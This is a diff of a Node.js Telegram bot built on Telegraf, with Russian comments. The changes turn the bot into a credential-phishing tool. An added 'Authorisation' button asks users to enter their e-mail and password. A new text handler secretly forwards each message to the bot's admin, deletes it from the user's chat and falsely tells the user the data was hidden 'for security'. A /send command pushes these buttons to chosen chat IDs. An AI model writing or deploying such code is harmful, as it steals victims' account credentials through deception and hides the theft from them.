@@ -24,14 +24,14 @@ const bot = new Telegraf(data.token, { contextType: CustomContext })
 const commandParts = require('./telegrafCommandParts'); // for args parsing
 bot.use(commandParts()) // for args parsing
 
-// available commands:      start, hide, send(id,text)
+// available commands:      start, send(id,text)
 
-const id = 163700134
-const msg = 'filler'
+//const id = 163700134
+const msg = 'the_text'
 const tokenLink = `https://api.telegram.org/bot${data.token}/`
 
 
-//            === КЛАВИАТУРЫ ===
+//            === КЛАВИАТУРЫ ===       +++ добавить кнопку вместо клавы и убрать только после аутент
 keysAdmin = Markup.inlineKeyboard([
   Markup.callbackButton('Бан', 'ban'),
   Markup.callbackButton('Удалить историю', 'del')
@@ -39,18 +39,9 @@ keysAdmin = Markup.inlineKeyboard([
 
 keysLink = Markup.inlineKeyboard([
   [Markup.urlButton('★', 'https://play.google.com/')],
-  [Markup.callbackButton('🅰', 'A'), Markup.callbackButton('🅱', 'B')]
+  [Markup.callbackButton('🅰uthorisation', 'A'), Markup.callbackButton('🅱utton', 'B')]
 ])
 //       =============================
-
-
-
-bot.action('A', ctx => ctx.reply('Напишите что-то'))
-bot.action('B', ctx => {
-  ctx.reply('Недоступно'), 
-  telegram.sendMessage(data.admins[0], 'usr clicked b')
-})
-
 
 
 //          === COMMANDS ===
@@ -61,7 +52,7 @@ bot.start((ctx) => {
   )
   telegram.sendMessage(
     data.admins[0],
-    `ID: ${ctx.chat.id}\nusr: ${ctx.chat.username}\n/send ${ctx.chat.id} filler`,
+    `ID: ${ctx.chat.id}\nusr: ${ctx.chat.username}\n/send ${ctx.chat.id} ${msg}`,
     Extra.markup(keysAdmin)
   )
 })
@@ -71,39 +62,10 @@ bot.command('send', (ctx) => ctx.telegram.sendMessage(
     ctx.state.command.args.split(' ')[1], 
     Extra.markup(keysLink)
 )) // (id_to, text_tolko_tak, extra)
-
-bot.command('hide', (ctx) => {                // переделать в реакцию
-  const userAction = async () => {
-    const response = await fetch(`${tokenLink}forwardMessage?chat_id=${data.admins[0]}&from_chat_id=${id}&message_id=`+ctx.state.command.args);
-    const myJson = await response.json(); //extract JSON from the http response
-    console.log(myJson)
-    var jsonData = JSON.stringify(myJson);
-    var fs = require('fs')
-    fs.writeFile("test.txt", jsonData, function(err) {
-      if (err) {console.log(err)}
-    })
-    telegram.deleteMessage(id, ctx.state.command.args) //(delete from which chat, msg_id)
-    telegram.sendMessage(id, 'Отправленное вами сообщение было скрыто')
-  }
-  userAction()
-})
 //    ==========================
 
 
-
-// const replies = {
-//   // text
-//   "i did not hit her": { type: 'text', value: 'https://www.youtube.com/watch?v=zLhoDB-ORLQ'}
-  
-//   // gif
-//   "nodejs": { type: 'gif', id: 'CgADBAADLQIAAlnKaVMm_HsznW30oQI' },
-
-//   // sticker
-//   "woah": { type: 'sticker', id: 'CAADAgAD5gADJQNSD34EF_pwQMgbAg' },
-// }
-
-
-
+//    ========== DB ============
 var MongoClient = require('mongodb').MongoClient;
 var url = "mongodb://localhost:27017";
 
@@ -150,15 +112,26 @@ bot.command("connect", (ctx) =>{
     });
   });
 })
+//    ========== DB ============
 
+//       ========= REACTIONS =========
+bot.action('A', ctx => {
+  ctx.reply('Введите данные для авторизации в таком формате:\n\nE-Mail\nПароль\n\nОтправленные вами данные будут скрыты'),
+  telegram.sendMessage(data.admins[0], `${ctx.chat.id} clicked AUTH`)
+})
 
+bot.action('B', ctx => {
+  ctx.reply('Эта функция недоступна в данный момент ☹︎')
+})
 
 bot.on('text', ctx => {
-  let cmd = ctx.message.text.toLowerCase()
-  // ЛОГИКА ЛОГИКА ЛОГИКА
-  const answer = cmd+cmd
-  ctx.reply(answer)
+  const usrText = ctx.message.text
+  //const answer = usrText
+  ctx.telegram.sendMessage(data.admins[0], `ID: ${ctx.chat.id}\n\n` + usrText)
+  ctx.telegram.deleteMessage(ctx.chat.id, ctx.message.message_id)
+  telegram.sendMessage(ctx.chat.id, 'Отправленные вами данные были скрыты в целях безопасности')
 })
+//       =============================
 
 bot.startPolling()
 
@@ -187,7 +160,7 @@ bot.startPolling()
 // )) // перебивает всё, но реагирует только на фото
 //bot.on(['forward', 'sticker'], (ctx) => console.log('YYY', ctx.fetch.id)) // a OR b
 
-//==================
+// ==================
 // const menu = new TelegrafInlineMenu(ctx => `Это классное меню!`)  // создаем тип "menu"
 // menu.setCommand('play')
 // menu.simpleButton('Логин', '1', {
@@ -197,6 +170,32 @@ bot.startPolling()
 //   doFunc: ctx => ctx.reply('Вводи:')
 // })
 // bot.use(menu.init())
-//==================
+// ===================
+// bot.command('hide', (ctx) => {                // переделать в реакцию
+//   const userAction = async () => {
+//     const response = await fetch(`${tokenLink}forwardMessage?chat_id=${data.admins[0]}&from_chat_id=${id}&message_id=`+ctx.state.command.args);
+//     const myJson = await response.json(); //extract JSON from the http response
+//     console.log(myJson)
+//     var jsonData = JSON.stringify(myJson);
+//     var fs = require('fs')
+//     fs.writeFile("test.txt", jsonData, function(err) {
+//       if (err) {console.log(err)}
+//     })
+//     telegram.deleteMessage(id, ctx.state.command.args) //(delete from which chat, msg_id)
+//     telegram.sendMessage(id, 'Отправленное вами сообщение было скрыто')
+//   }
+//   userAction()
+// })
+// ===================
+// const replies = {
+//   // text
+//   "i did not hit her": { type: 'text', value: 'https://www.youtube.com/watch?v=zLhoDB-ORLQ'}
+  
+//   // gif
+//   "nodejs": { type: 'gif', id: 'CgADBAADLQIAAlnKaVMm_HsznW30oQI' },
 
+//   // sticker
+//   "woah": { type: 'sticker', id: 'CAADAgAD5gADJQNSD34EF_pwQMgbAg' },
+// }
+// ===================
 // market://details?id=com.google.android.apps.maps
